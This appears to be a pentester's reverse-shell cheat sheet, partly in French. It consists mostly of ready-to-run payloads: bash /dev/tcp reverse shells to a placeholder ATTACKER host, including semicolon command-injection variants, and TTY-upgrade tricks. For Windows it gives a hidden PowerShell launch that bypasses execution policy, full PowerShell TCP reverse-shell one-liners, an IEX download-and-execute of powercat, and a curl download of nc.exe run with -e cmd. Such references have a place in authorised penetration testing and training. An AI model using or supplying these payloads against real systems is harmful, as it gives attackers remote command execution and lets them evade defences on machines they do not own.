# Reverse Shells

## Ressources

* [revshells.com](https://www.revshells.com/)
* [pentestmonkey - reverse shell cheatsheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
* [InternalAllTheThings - shell reverse cheatsheet](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/)
* [shellerator](https://github.com/ShutdownRepo/shellerator)
* [revshellgen](https://github.com/t0thkr1s/revshellgen)

## Linux

### Reverse Shell

```bash
nc -nlvp 4444

bash -i >& /dev/tcp/ATTACKER/4444 0>&1

# variante bash -c — utile pour injection (SQLi RCE, commande système, etc.)
bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"

# via point-virgule (injection dans un paramètre)
; bash -c 'bash -i >& /dev/tcp/ATTACKER/443 0>&1'
```

### Upgrade TTY

```bash
# Étape 1 — dans le reverse shell
python -c 'import pty; pty.spawn("/bin/bash")'
# ou
/usr/bin/script -qc /bin/bash /dev/null

# Étape 2 — mettre en arrière-plan
Ctrl-Z

# Étape 3 — sur Kali
stty raw -echo
fg

# Étape 4 — dans le reverse shell
reset
export SHELL=bash
export TERM=xterm-256color
stty rows <num> columns <cols>
```

### Spawning a shell

```bash
/bin/sh -i
echo os.system('/bin/bash')

# Vi
:!bash
:set shell=/bin/bash:shell

perl -e 'exec "/bin/sh";'
ruby: exec "/bin/sh"
lua: os.execute('/bin/bash')
```


## Windows

```powershell
# -nop        : NoProfile — ne charge pas le profil PowerShell (plus furtif, plus rapide)
# -noni       : NonInteractive — pas de prompt, pas d'input utilisateur
# -w hidden   : WindowStyle Hidden — fenêtre invisible
# -ep bypass  : ExecutionPolicy Bypass — ignore la politique d'exécution des scripts
# -e          : EncodedCommand — payload base64 encodé en UTF-16LE

powershell -nop -noni -w hidden -ep bypass -e <BASE64_PAYLOAD>
```

### Payloads

```powershell
$client = New-Object System.Net.Sockets.TCPClient('Y.Y.Y.Y',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

```powershell
IEX(New-Object System.Net.WebClient).DownloadString('http://Y.Y.Y.Y/powercat.ps1');powercat -c Y.Y.Y.Y -p 4444 -e powershell

cd /usr/share/powershell-empire/empire/server/data/module_source/management
python3 -m http.server 80
```

```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

```powershell
curl http://Y.Y.Y.Y/nc.exe -o C:/Windows/Temp/nc.exe

C:/Windows/Temp/nc.exe Y.Y.Y.Y 4444 -e cmd
```
